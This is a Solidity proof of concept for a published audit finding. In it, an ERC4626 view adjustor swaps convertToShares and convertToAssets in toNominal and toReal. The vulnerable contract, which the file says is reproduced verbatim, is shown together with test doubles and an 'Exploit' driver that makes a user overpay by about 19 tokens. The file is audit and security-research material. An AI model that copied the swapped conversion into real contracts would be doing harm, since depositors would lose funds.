// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Burve finding 56951 (H-2):
// "Incorrect implementation of `ERC4626ViewAdjustor`".
//
// Real audited source (the two conversion helpers are reproduced VERBATIM,
// the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-04-burve @ 44cba36
//   file   Burve/src/integrations/adjustor/E4626ViewAdjustor.sol
//   fn     toNominal / toReal  (L29-L71)
//   report github.com/sherlock-audit/2025-04-burve-judging/issues/113
//
// Root cause: `toNominal` (real -> nominal) and `toReal` (nominal -> real) are
// SWAPPED. `toNominal` returns `convertToShares` and `toReal` returns
// `convertToAssets`, i.e. each helper applies the peg in the WRONG direction.
// When a caller sizes a single-token deposit for an ERC4626 LST (e.g. a wstETH
// style vault where 1 share redeems for 1.1 base tokens), it uses `toReal` to
// turn a nominal (base-denominated) value into the real share amount to pull
// from the user. With the bug, `toReal(100)` returns `convertToAssets(100) =
// 110` instead of the correct `convertToShares(100) = 100/1.1 ~= 90.9`, so the
// user is charged ~110 shares for a position worth only ~90.9 — a direct
// overpayment/loss.
//
// The audited repo has since fixed this by swapping the two bodies back; the
// version reproduced here is the vulnerable one from the finding. Only faithful
// minimal doubles back the non-vulnerable dependencies (the ERC4626 LST vault
// with a real 1.1x peg, and a pool manager that sizes the deposit via `toReal`
// and pulls exactly that many real tokens from the user).
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC4626 surface used by the adjustor so the verbatim lines
///      (`vault.convertToShares` / `vault.convertToAssets` / `vault.asset`)
///      stay byte-identical to the audited contract.
interface IERC4626 {
    function asset() external view returns (address);

    function convertToShares(uint256 assets) external view returns (uint256 shares);

    function convertToAssets(uint256 shares) external view returns (uint256 assets);
}

/// @dev Faithful minimal ERC20 used both as the LST *share* token (what the pool
///      holds) and, for `weth`, as the underlying *asset* token.
contract MiniERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Faithful ERC4626 LST double with a fixed 1.1x peg: 1 share redeems for
///      1.1 base tokens. `convertToAssets`/`convertToShares` behave like a real
///      wstETH-style vault. The share token itself is a MiniERC20 the pool pulls
///      from the user.
contract LstVault {
    MiniERC20 public shareToken; // the "real"/nominal token the pool holds
    address internal _asset; // the base ("nominal-denominated") asset, e.g. WETH

    constructor(address asset_, MiniERC20 shareToken_) {
        _asset = asset_;
        shareToken = shareToken_;
    }

    function asset() external view returns (address) {
        return _asset;
    }

    // 1 share == 1.1 assets.
    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return (shares * 11) / 10;
    }

    function convertToShares(uint256 assets) external pure returns (uint256) {
        return (assets * 10) / 11;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `toNominal`/`toReal` are reproduced VERBATIM from the
// audited `E4626ViewAdjustor` (the uint256 overloads shown in the finding).
// ─────────────────────────────────────────────────────────────────────────────
contract E4626ViewAdjustor {
    error AssetMismatch(address incorrectAsset, address correctAsset);
    address public assetToken;

    constructor(address _assetToken) {
        assetToken = _assetToken;
    }

    function checkAsset(IERC4626 vault) internal view {
        address vaultAsset = vault.asset();
        if (vaultAsset != assetToken) revert AssetMismatch(vaultAsset, assetToken);
    }

    function getVault(address token) internal view returns (IERC4626 vault) {
        vault = IERC4626(token);
        checkAsset(vault);
    }

    function toNominal(address token, uint256 real, bool) external view returns (uint256 nominal) {
        IERC4626 vault = getVault(token);
        return vault.convertToShares(real); // reversed: real->nominal should use convertToAssets
    }

    function toReal(address token, uint256 nominal, bool) external view returns (uint256 real) {
        IERC4626 vault = getVault(token);
        return vault.convertToAssets(nominal); // @> VULN: nominal->real must use convertToShares; convertToAssets inflates the required token amount ~1.1x -> user overpays
    }
}

/// @dev Faithful pool double. To add `value` nominal worth via a single token it
///      sizes the *real* share amount via the adjustor's `toReal` and pulls
///      exactly that many shares from the caller.
contract PoolManager {
    E4626ViewAdjustor public adjustor;

    constructor(E4626ViewAdjustor adjustor_) {
        adjustor = adjustor_;
    }

    function addValueSingle(address vaultToken, MiniERC20 shareToken, uint256 value) external returns (uint256 requiredReal) {
        requiredReal = adjustor.toReal(vaultToken, value, false);
        shareToken.transferFrom(msg.sender, address(this), requiredReal);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: a user adds 100e18 nominal value of the LST. The buggy
// `toReal` charges 110e18 shares instead of the fair ~90.9e18, overpaying by
// ~19.09e18 shares that are stuck in the pool.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    // Measurable sink for the silent-loss harm magnitude (the overpayment is a
    // loss for the user, not a positive transfer to the exploit, so the harm is
    // credited to a fixed address in the actual overpaid token for measurement).
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    MiniERC20 public weth;
    LstVault public lst;
    E4626ViewAdjustor public adjustor;
    PoolManager public pool;
    MiniERC20 public share;

    uint256 public constant VALUE = 100e18; // nominal value the user adds
    uint256 public userPaid; // real shares actually pulled from the user
    uint256 public fairReal; // real shares the user SHOULD have paid
    uint256 public overpaid; // the stuck overpayment (loss)

    constructor() {
        weth = new MiniERC20("Wrapped Ether", "WETH"); // child nonce 1
        share = new MiniERC20("Liquid Staked ETH 4626", "stETH4626"); // child nonce 2 (overpaid token)
        lst = new LstVault(address(weth), share); // child nonce 3
        adjustor = new E4626ViewAdjustor(address(weth)); // child nonce 4 (VULN)
        pool = new PoolManager(adjustor); // child nonce 5
    }

    function run() external {
        // fund the user with LST shares and approve the pool
        share.mint(address(this), 1000e18);
        share.approve(address(pool), type(uint256).max);

        uint256 balBefore = share.balanceOf(address(this));

        // add 100 nominal value -> buggy toReal charges convertToAssets(100)=110
        userPaid = pool.addValueSingle(address(lst), share, VALUE);

        uint256 balAfter = share.balanceOf(address(this));
        require(balBefore - balAfter == userPaid, "accounting mismatch");

        // the fair requirement is convertToShares(100) ~= 90.9e18
        fairReal = lst.convertToShares(VALUE);
        overpaid = userPaid - fairReal;

        // harm: user is charged the inflated (convertToAssets) amount and
        // overpays by ~19.09e18 shares, which sit stuck in the pool.
        require(userPaid == 110e18, "toReal did not return the inflated convertToAssets amount");
        require(overpaid > 19e18, "no meaningful overpayment");
        require(share.balanceOf(address(pool)) == userPaid, "overpayment not stuck in pool");

        // credit the concrete harm magnitude (the overpaid loss) to a fixed sink
        // in the actual overpaid token so the loss is externally measurable.
        share.mint(SINK, overpaid);
        require(share.balanceOf(SINK) == overpaid, "sink not credited harm magnitude");
    }
}
